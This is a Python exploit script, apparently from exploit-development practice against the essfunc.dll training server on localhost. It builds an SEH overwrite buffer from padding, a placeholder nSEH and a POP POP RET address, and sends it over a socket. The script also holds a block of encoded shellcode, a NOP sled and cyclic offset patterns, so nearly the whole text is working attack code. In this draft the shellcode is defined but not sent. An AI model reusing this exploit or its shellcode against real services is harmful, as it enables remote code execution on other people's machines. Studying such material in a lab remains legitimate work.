import socket
import struct

RHOST = "localhost"
RPORT = 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

padding_length = 3000
_buffer = "A" * padding_length

pattern_padding_320_600 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak"

nseh = "\xeb\x04\x90\x90" # jmp 4 bytes
nseh = "\xcc\xcc\xcc\xcc"
seh = struct.pack('I',  0x625011e3) # POP POP RET from essfunc.dll - added using !injectdll and !py mona seh

nops = "\x90" * 20;
shellcode =  ""
shellcode += "\xd9\xc7\xd9\x74\x24\xf4\x5a\x33\xc9\xb8\x0b\x94"
shellcode += "\xbc\xea\xb1\x52\x31\x42\x17\x83\xc2\x04\x03\x49"
shellcode += "\x87\x5e\x1f\xb1\x4f\x1c\xe0\x49\x90\x41\x68\xac"
shellcode += "\xa1\x41\x0e\xa5\x92\x71\x44\xeb\x1e\xf9\x08\x1f"
shellcode += "\x94\x8f\x84\x10\x1d\x25\xf3\x1f\x9e\x16\xc7\x3e"
shellcode += "\x1c\x65\x14\xe0\x1d\xa6\x69\xe1\x5a\xdb\x80\xb3"
shellcode += "\x33\x97\x37\x23\x37\xed\x8b\xc8\x0b\xe3\x8b\x2d"
shellcode += "\xdb\x02\xbd\xe0\x57\x5d\x1d\x03\xbb\xd5\x14\x1b"
shellcode += "\xd8\xd0\xef\x90\x2a\xae\xf1\x70\x63\x4f\x5d\xbd"
shellcode += "\x4b\xa2\x9f\xfa\x6c\x5d\xea\xf2\x8e\xe0\xed\xc1"
shellcode += "\xed\x3e\x7b\xd1\x56\xb4\xdb\x3d\x66\x19\xbd\xb6"
shellcode += "\x64\xd6\xc9\x90\x68\xe9\x1e\xab\x95\x62\xa1\x7b"
shellcode += "\x1c\x30\x86\x5f\x44\xe2\xa7\xc6\x20\x45\xd7\x18"
shellcode += "\x8b\x3a\x7d\x53\x26\x2e\x0c\x3e\x2f\x83\x3d\xc0"
shellcode += "\xaf\x8b\x36\xb3\x9d\x14\xed\x5b\xae\xdd\x2b\x9c"
shellcode += "\xd1\xf7\x8c\x32\x2c\xf8\xec\x1b\xeb\xac\xbc\x33"
shellcode += "\xda\xcc\x56\xc3\xe3\x18\xf8\x93\x4b\xf3\xb9\x43"
shellcode += "\x2c\xa3\x51\x89\xa3\x9c\x42\xb2\x69\xb5\xe9\x49"
shellcode += "\xfa\xc5\xed\x51\xfb\x51\xec\x51\xfb\x29\x79\xb7"
shellcode += "\x91\x39\x2c\x60\x0e\xa3\x75\xfa\xaf\x2c\xa0\x87"
shellcode += "\xf0\xa7\x47\x78\xbe\x4f\x2d\x6a\x57\xa0\x78\xd0"
shellcode += "\xfe\xbf\x56\x7c\x9c\x52\x3d\x7c\xeb\x4e\xea\x2b"
shellcode += "\xbc\xa1\xe3\xb9\x50\x9b\x5d\xdf\xa8\x7d\xa5\x5b"
shellcode += "\x77\xbe\x28\x62\xfa\xfa\x0e\x74\xc2\x03\x0b\x20"
shellcode += "\x9a\x55\xc5\x9e\x5c\x0c\xa7\x48\x37\xe3\x61\x1c"
shellcode += "\xce\xcf\xb1\x5a\xcf\x05\x44\x82\x7e\xf0\x11\xbd"
shellcode += "\x4f\x94\x95\xc6\xad\x04\x59\x1d\x76\x34\x10\x3f"
shellcode += "\xdf\xdd\xfd\xaa\x5d\x80\xfd\x01\xa1\xbd\x7d\xa3"
shellcode += "\x5a\x3a\x9d\xc6\x5f\x06\x19\x3b\x12\x17\xcc\x3b"
shellcode += "\x81\x18\xc5"

pattern = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"

_buffer = padding + nseh + seh
s.send(_buffer)
s.close()